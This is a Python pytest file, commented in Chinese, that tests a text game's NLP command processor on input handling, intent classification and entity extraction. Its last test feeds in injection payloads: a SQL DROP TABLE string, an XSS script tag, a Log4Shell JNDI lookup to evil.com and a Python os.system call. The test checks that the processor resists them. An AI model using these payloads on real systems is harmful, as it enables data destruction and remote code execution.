"""
单元测试 - NLP 处理器
测试 NLPProcessor 的核心功能
"""

import pytest
import json
import os
from unittest.mock import Mock, patch, MagicMock
from typing import Dict, List, Any

# 设置测试环境
os.environ['DEEPSEEK_API_KEY'] = 'test'
os.environ['ENABLE_CONTEXT_COMPRESSION'] = 'true'

from xwe.core.nlp.nlp_processor import NLPProcessor
from xwe.core.nlp.llm_client import LLMClient


class TestNLPProcessor:
    """NLP 处理器单元测试"""
    
    @pytest.fixture
    def nlp_processor(self):
        """创建 NLP 处理器实例"""
        return NLPProcessor(use_context_compression=True)
    
    @pytest.fixture
    def mock_llm_client(self):
        """创建模拟的 LLM 客户端"""
        mock_client = Mock(spec=LLMClient)
        mock_client.chat.return_value = json.dumps({
            "normalized_command": "探索",
            "intent": "action",
            "args": {},
            "explanation": "玩家想要探索周围环境"
        })
        return mock_client
    
    def test_initialization(self):
        """测试初始化"""
        processor = NLPProcessor(use_context_compression=False)
        assert processor is not None
        assert hasattr(processor, 'process')
        
        # 测试带压缩的初始化
        processor_with_compression = NLPProcessor(use_context_compression=True)
        assert processor_with_compression is not None
        if hasattr(processor_with_compression, 'context_compressor'):
            assert processor_with_compression.context_compressor is not None
    
    def test_process_simple_command(self, nlp_processor):
        """测试处理简单命令"""
        result = nlp_processor.process("探索周围环境")
        
        assert result is not None
        assert isinstance(result, dict)
        assert 'normalized_command' in result
        assert 'intent' in result
    
    def test_process_with_context(self, nlp_processor):
        """测试带上下文的处理"""
        context = [
            {"role": "user", "content": "我在哪里？"},
            {"role": "assistant", "content": "你在青云城"}
        ]
        
        result = nlp_processor.process("继续探索", context)
        
        assert result is not None
        assert isinstance(result, dict)
    
    def test_empty_input_handling(self, nlp_processor):
        """测试空输入处理"""
        # 空字符串
        result = nlp_processor.process("")
        assert result is not None
        assert result.get('intent') in ['unknown', 'error', None]
        
        # 纯空格
        result = nlp_processor.process("   ")
        assert result is not None
        
        # None 输入
        result = nlp_processor.process(None)
        assert result is not None
    
    def test_oversized_input_handling(self, nlp_processor):
        """测试超大输入处理"""
        # 超长命令
        long_command = "探索" * 1000
        result = nlp_processor.process(long_command)
        assert result is not None
        
        # 验证输入被截断或正确处理
        if 'error' not in result:
            assert len(str(result)) < len(long_command) * 10
    
    def test_special_characters_handling(self, nlp_processor):
        """测试特殊字符处理"""
        special_commands = [
            "使用道具[破天剑]",
            "前往<幽冥谷>",
            "与NPC{商人}对话",
            "使用技能|烈火剑|"
        ]
        
        for cmd in special_commands:
            result = nlp_processor.process(cmd)
            assert result is not None
            assert 'error' not in result or result['error'] is None
    
    def test_unicode_handling(self, nlp_processor):
        """测试 Unicode 处理"""
        unicode_commands = [
            "使用表情😊战斗💪",
            "前往東方（繁体）",
            "与NPC「李白」对话",
            "使用道具：破天剑！"
        ]
        
        for cmd in unicode_commands:
            result = nlp_processor.process(cmd)
            assert result is not None
            # 确保返回的是有效的 UTF-8 字符串
            assert isinstance(result.get('normalized_command', ''), str)
    
    @patch('xwe.core.nlp.nlp_processor.LLMClient')
    def test_llm_integration(self, mock_llm_class, nlp_processor):
        """测试 LLM 集成"""
        # 设置模拟返回值
        mock_instance = mock_llm_class.return_value
        mock_instance.chat.return_value = json.dumps({
            "normalized_command": "测试命令",
            "intent": "test",
            "args": {"param": "value"}
        })
        
        # 使用模拟客户端但需要提供 API key
        with patch.dict(os.environ, {'DEEPSEEK_API_KEY': 'test'}):
            processor = NLPProcessor()
            processor.llm_client = mock_instance
            
            result = processor.process("测试命令")
            
            # 验证 LLM 被调用
            mock_instance.chat.assert_called_once()
            assert result['normalized_command'] == "测试命令"
            assert result['intent'] == "test"
    
    def test_json_parsing_errors(self, nlp_processor):
        """测试 JSON 解析错误处理"""
        with patch.object(nlp_processor.llm_client, 'chat') as mock_chat:
            # 返回无效的 JSON
            mock_chat.return_value = "这不是有效的JSON"
            
            result = nlp_processor.process("测试")
            assert result is not None
            # 应该有降级处理
    
    def test_timeout_handling(self, nlp_processor):
        """测试超时处理"""
        with patch.object(nlp_processor.llm_client, 'chat') as mock_chat:
            # 模拟超时
            mock_chat.side_effect = TimeoutError("Request timeout")
            
            result = nlp_processor.process("测试超时")
            assert result is not None
            # 应该返回默认结果或错误信息
    
    def test_context_compression_integration(self):
        """测试上下文压缩集成"""
        processor = NLPProcessor(use_context_compression=True)
        
        # 创建大量上下文
        large_context = []
        for i in range(100):
            large_context.extend([
                {"role": "user", "content": f"命令{i}"},
                {"role": "assistant", "content": f"响应{i}"}
            ])
        
        # 处理时应该压缩上下文
        result = processor.process("新命令", large_context)
        assert result is not None
        
        # 如果有压缩器，验证它被使用
        if hasattr(processor, 'context_compressor') and processor.context_compressor:
            # 压缩后的上下文应该更小
            compressed = processor.context_compressor.compress(large_context)
            assert len(str(compressed)) < len(str(large_context))
    
    def test_rate_limiting(self, nlp_processor):
        """测试速率限制"""
        # 快速发送多个请求
        results = []
        for i in range(10):
            result = nlp_processor.process(f"快速请求{i}")
            results.append(result)
        
        # 所有请求都应该被处理
        assert len(results) == 10
        assert all(r is not None for r in results)
    
    @pytest.mark.skip(reason="single-player")
    def test_concurrent_processing(self, nlp_processor):
        """测试并发处理"""
        import threading
        results = []
        errors = []
        
        def process_command(cmd):
            try:
                result = nlp_processor.process(cmd)
                results.append(result)
            except Exception as e:
                errors.append(str(e))
        
        # 创建多个线程
        threads = []
        for i in range(10):
            t = threading.Thread(target=process_command, args=(f"并发命令{i}",))
            threads.append(t)
            t.start()
        
        # 等待所有线程完成
        for t in threads:
            t.join()
        
        # 验证结果
        assert len(errors) == 0
        assert len(results) == 10
    
    def test_custom_prompts(self, nlp_processor):
        """测试自定义提示词"""
        # 如果处理器支持自定义提示词
        if hasattr(nlp_processor, 'set_prompt'):
            custom_prompt = "你是一个游戏助手，请简洁回答。"
            nlp_processor.set_prompt(custom_prompt)
            
            result = nlp_processor.process("帮助")
            assert result is not None
    
    def test_language_detection(self, nlp_processor):
        """测试语言检测"""
        multilingual_commands = [
            ("查看背包", "zh"),
            ("check inventory", "en"),
            ("インベントリを見る", "ja")
        ]
        
        for cmd, expected_lang in multilingual_commands:
            result = nlp_processor.process(cmd)
            assert result is not None
            # 如果支持语言检测，验证语言
            if 'detected_language' in result:
                assert result['detected_language'] == expected_lang
    
    def test_command_normalization(self, nlp_processor):
        """测试命令标准化"""
        similar_commands = [
            "查看背包",
            "打开背包",
            "看看背包",
            "背包",
            "查看包裹"
        ]
        
        results = []
        for cmd in similar_commands:
            result = nlp_processor.process(cmd)
            if result and 'normalized_command' in result:
                results.append(result['normalized_command'])
        
        # 相似命令应该被标准化为相同或相似的形式
        # 这里简化验证，实际可能需要更复杂的逻辑
        assert len(set(results)) <= 2  # 最多2种不同的标准化结果
    
    def test_intent_classification(self, nlp_processor):
        """测试意图分类"""
        test_cases = [
            ("探索周围", "action"),
            ("查看状态", "check"),
            ("使用回血丹", "use"),
            ("与商人对话", "talk"),
            ("购买物品", "trade")
        ]
        
        for cmd, expected_intent_type in test_cases:
            result = nlp_processor.process(cmd)
            assert result is not None
            assert 'intent' in result
            # 验证意图类型（可能不完全匹配，但应该合理）
            intent = result['intent']
            assert isinstance(intent, str)
    
    def test_entity_extraction(self, nlp_processor):
        """测试实体提取"""
        test_cases = [
            ("使用回血丹", ["回血丹"]),
            ("与李白对话", ["李白"]),
            ("前往东方森林", ["东方森林"]),
            ("购买10个苹果", ["10", "苹果"])
        ]
        
        for cmd, expected_entities in test_cases:
            result = nlp_processor.process(cmd)
            assert result is not None
            
            # 如果支持实体提取
            if 'entities' in result or 'args' in result:
                entities = result.get('entities', result.get('args', {}))
                # 验证是否包含预期的实体（简化验证）
                entities_str = str(entities)
                for entity in expected_entities:
                    assert entity in entities_str or entity in cmd


class TestErrorHandling:
    """错误处理相关的测试"""
    
    def test_malformed_input_recovery(self):
        """测试异常输入的恢复"""
        processor = NLPProcessor()
        
        malformed_inputs = [
            None,
            123,  # 数字
            [],   # 列表
            {},   # 字典
            object(),  # 对象
        ]
        
        for bad_input in malformed_inputs:
            try:
                result = processor.process(bad_input)
                assert result is not None
            except Exception as e:
                pytest.fail(f"处理异常输入时崩溃: {e}")
    
    def test_injection_protection(self):
        """测试注入攻击防护"""
        processor = NLPProcessor()
        
        injection_attempts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "${jndi:ldap://evil.com/a}",
            "__import__('os').system('ls')"
        ]
        
        for attempt in injection_attempts:
            result = processor.process(attempt)
            assert result is not None
            # 确保没有执行恶意代码
            assert 'error' not in result or 'injection' not in str(result.get('error', ''))


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
